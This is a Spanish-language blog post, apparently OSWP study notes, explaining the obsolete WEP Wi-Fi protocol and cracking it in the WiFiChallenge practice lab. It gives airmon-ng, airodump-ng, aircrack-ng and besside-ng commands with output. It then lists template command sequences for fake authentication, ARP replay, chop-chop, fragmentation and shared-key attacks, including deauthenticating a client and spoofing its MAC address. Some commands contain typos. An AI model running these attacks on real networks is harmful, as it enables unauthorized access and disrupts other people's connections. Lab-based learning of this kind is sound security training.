---
layout: single
title: Hacking Wifi WEP
excerpt: "En este post vamos a estar explicando que es el protocolo WEP en el mundo del wifi y mostrando ataques para este protocolo que ya se encuntra obsoleto a dia de hoy"
date: 2024-01-22
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/hacking-wep-wifi/icon.png
  teaser_home_page: true
categories:
  - Hacking Wifi
  - WEP
tags:  
  - OSWP
  - WEP
  - Hacking Wifi
---

## Introducción WEP

Wired Equivalent Privacy (Privacidad Equivalente a la Conexión por Cable), es un protocolo de seguridad diseñado para proteger las redes inalámbricas. Fue uno de los primeros estándares de seguridad utilizado en redes Wi-Fi, pero se considera obsoleto y se ha vuelto vulnerable a ataques, este protocolo cifra el tráfico con una clave hexadecimal de **64 o 128 bits** todo el tráfico se cifra con una única clave.

>WEP utiliza un esquema de cifrado de clave compartida, donde todas las estaciones en la red comparten una clave secreta. El problema principal con WEP es que presenta debilidades significativas en su implementación del cifrado, lo que hace que sea relativamente fácil para los atacantes interceptar y descifrar el tráfico de la red. Los ataques a WEP incluyen la recopilación de paquetes y el uso de herramientas como Aircrack-ng para descifrar la clave.

## Creando un AP que use el protocolo WEP

En caso de que quieras desplegar el **AP** tu mismo puedes seguir estos pasos para hacerlo exitosamente <https://tonyharris.io/posts/virtual_wifi_lab/> en mi caso estare empleando el **AP** ya desplegado del **WifiChallengev2** <https://wifichallengelab.com/>

## Atacando el protocolo WEP

Bueno lo primero que haremos es poner nuestra antena de red en modo monitor en caso de estar empleando el lab de **wifichallenge** ya tiene integrada la interfaz asi que solo haremos lo siguiente

>Las partes censuradas es por que hay mas usuarios completando el laboratorio para evitar una mala experiencia y meterme en problemas con el creador lo hare de esa forma.

```bash
root@WiFiChallengeLab:/home/user/AP# airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    611 avahi-daemon
    614 NetworkManager
    633 wpa_supplicant
    665 avahi-daemon
    945 ifplugd

PHY	Interface	Driver		Chipset

phy0	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
phy1	wlan1		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy2	wlan2		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy3	wlan3		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy4	wlan4		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy5	wlan5		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy6	wlan6		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy60	wlan60		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
```

Ahora matamos los procesos que no nos sirven

```bash
root@WiFiChallengeLab:/home/user/AP# airmon-ng check kill

Killing these processes:

    PID Name
    633 wpa_supplicant
    945 ifplugd
 406555 avahi-daemon
 406769 avahi-daemon

root@WiFiChallengeLab:/home/user/AP# 
```

Una vez hecho esto comenzamos capturando el trafico en este caso vemos que el **AP** existe y esta operativo

![](https://i.imgur.com/tGjkeMj.png)

```bash
❯ airodump-ng wlan0mon
```

Y bueno hay un cliente asociado a ese **AP** vamos a estar capturando paquetes en la columna de **Data** entre mas tengamos mas probabilidades hay de crackear la contraseña

```bash
root@WiFiChallengeLab:/home/user/AP# airodump-ng wlan0mon -c 1 -w captura
```

Podemos ver que ya hemos recolectado muchos 

![](https://i.imgur.com/OABgdbb.png)

Una vez paramos el ataque podemos hacer lo siguiente para crackear la contraseña

```bash
root@WiFiChallengeLab:/home/user/AP# aircrack-ng captura-01.cap -w /root/wifi-rockyou.txt
```

En caso de no encontrar la contraseña veras algo como esto **Si la contraseña fue encontrada la veras en texto plano**

![](https://i.imgur.com/yzgc60n.png)

Ahora podemos usar otra herramienta que es **besside-ng** ya que esta herramienta esta diseñada para encontrar claves **WEP** solo le pasamos la **MAC** y el canal en el que opera

```bash
root@WiFiChallengeLab:/home/user/AP# besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2
```

Ahora podemos ver la **KEY**

![](https://i.imgur.com/5hWf7M7.png)

## Mas ataques

Este protocolo esta obsoleto pero aqui te comparto mas ataques

# Fake Authentication Attack

```bash
❯ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
❯ aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
❯ aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
❯ aircrack-ng –b <BSSID> <archivoPCAP>
```

# ARP Replay Attack

```bash
❯ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
❯ aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
❯ aircrack-ng –b <BSSID> <archivoPCAP>
```

# Chop Chop Attack

```bash
❯ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
❯ aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
❯ aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
 # Presionamos ‘y’ ;
❯ packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
❯ aireplay-ng -2 –r <FileName2> wlan0mon
❯ aircrack-ng <archivoPCAP>
```

# Fragmentation Attack

```bash
❯ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
❯aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
❯aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
# Presionamos ‘y’ ;
❯ packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
❯ aireplay-ng -2 –r <FileName2> wlan0mon
❯ aircrack-ng <archivoPCAP>
```

# SKA Type Cracking

```bash
❯ airmon-ng start wlan0
❯ airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
❯ aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
❯ ifconfig wlan0mon down
❯ macchanger –-mac <macVictima> wlan0mon
❯ fconfig wlan0mon up
❯ aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
❯ aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
❯ ircrack-ng <archivoPCAP>
```
